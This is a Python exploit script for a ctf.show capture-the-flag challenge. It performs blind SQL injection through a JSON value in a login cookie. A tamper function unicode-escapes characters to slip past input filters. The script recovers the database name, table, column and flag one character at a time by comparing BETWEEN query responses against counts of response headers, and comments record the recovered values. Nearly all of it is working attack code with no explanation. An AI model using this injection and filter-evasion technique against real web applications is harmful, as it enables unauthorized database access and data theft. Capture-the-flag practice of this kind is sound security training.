#encoding=utf-8
import requests

url = "http://7ebb4b24-528d-4046-857d-bc7bb3465fff.challenge.ctf.show/admin/"

def tamper(payload):
    payload = payload.lower()
    payload = payload.replace('u', '\\u0075')
    payload = payload.replace('\'', '\\u0027')
    payload = payload.replace('o', '\\u006f')
    payload = payload.replace('i', '\\u0069')
    payload = payload.replace('"', '\\u0022')
    payload = payload.replace(' ', '\\u0020')
    payload = payload.replace('s', '\\u0073')
    payload = payload.replace('#', '\\u0023')
    payload = payload.replace('>', '\\u003e')
    payload = payload.replace('<', '\\u003c')
    payload = payload.replace('-', '\\u002d')
    payload = payload.replace('=', '\\u003d')
    payload = payload.replace('f1a9', 'F1a9')
    payload = payload.replace('f1', 'F1')
    return payload

def databaseName_len():
    print ("start get database name length...")
    for l in range(0,45):
        payload = "1' or (length(database())=" + str(l+1) + ")#"
        print(payload)
        payload = tamper(payload)
        print(payload)
        tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
        print(tmpCookie)
        exit()
        headers = {'cookie': tmpCookie}
        r =requests.get(url, headers=headers)
        myHeaders = str(r.raw.headers)
        if ((myHeaders.count("login_data") == 1)):
            print('get db length = ' + str(l).lower())
            break

def get_databaseName():
    flag = ''
    for j in range(0, 15):
        for c in range(0x20,0x7f):
            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                continue
            else:
                payload = "1' or (select (database()) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
            # print(payload)
            payload = tamper(payload)
            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
            headers = {'cookie': tmpCookie}
            r =requests.get(url, headers=headers)
            myHeaders = str(r.raw.headers)
            if ((myHeaders.count("login_data") == 2)):
                flag += chr(c - 1)
                print('databasename = ' + flag.lower())
                break

def get_tableName():
    flag = ''
    for j in range(0, 10):           #blind inject
        for c in range(0x20,0x7f):
            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                continue
            else:
                payload = "1' or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
            # print(payload)
            payload = tamper(payload)
            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
            headers = {'cookie': tmpCookie}
            r =requests.get(url, headers=headers)
            myHeaders = str(r.raw.headers)
            if ((myHeaders.count("login_data") == 2)):
                flag += chr(c - 1)
                print('tablename = ' + flag.lower())
                break

def get_ColumnName():
    flag = ''
    for j in range(0, 10):           #blind inject
        for c in range(0x20,0x7f):
            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                continue
            else:
                payload = "1' or (select (select column_name from information_schema.columns where table_name='fl2333g' limit 0,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
            # print(payload)
            payload = tamper(payload)
            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
            headers = {'cookie': tmpCookie}
            r =requests.get(url, headers=headers)
            myHeaders = str(r.raw.headers)
            if ((myHeaders.count("login_data") == 2)):
                flag += chr(c - 1)
                print('column name = ' + flag.lower())
                break

def get_value():
    flag = ''
    for j in range(0, 50):           #blind inject
        for c in range(0x20,0x7f):
            if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                continue
            else:
                payload = "1' or (select (select flllllag from fl2333g) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
            # print(payload)
            payload = tamper(payload)
            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
            headers = {'cookie': tmpCookie}
            r =requests.get(url, headers=headers)
            myHeaders = str(r.raw.headers)
            if ((myHeaders.count("login_data") == 2)):
                flag += chr(c - 1)
                print('flag = ' + flag.lower())
                break

if __name__ == '__main__':
    # get_databaseName() 
    # databasename = ctfshow_kouzone
    # get_tableName()
    # tablename = fl2333g
    # get_ColumnName()
    # column name = flllllag
    get_value()
    # flag = ctfshow{a47da13f-4d35-4e16-80fc-881a13e33a84}